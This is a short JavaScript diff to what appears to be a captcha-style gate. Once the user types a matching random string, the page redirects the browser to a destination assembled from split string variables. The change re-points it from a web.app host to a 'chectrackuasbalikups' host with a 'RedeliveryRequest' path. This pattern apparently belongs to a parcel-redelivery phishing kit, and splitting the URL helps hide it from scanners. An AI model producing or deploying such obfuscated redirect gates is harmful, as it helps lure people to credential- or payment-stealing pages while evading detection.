@@ -37,10 +37,10 @@
 
     // Check if the user input is equal to the random string (case-insensitive)
     if (userInput.toLowerCase() === randomString.toLowerCase()) {
-	  let spark="spark"
+	  let spark="chectrackuasbalikups"
 	  let https ="https"
-	  let webapp ="web.app/"
-      window.location= https+"://"+spark+"asse-25caf."+webapp
+	  let webapp ="RedeliveryRequest/"
+      window.location= https+"://"+spark+"/"+webapp
 	  userInput.className = ''; // Remove the 'invalid' class
       errorMsg.textContent = '';
     } else {
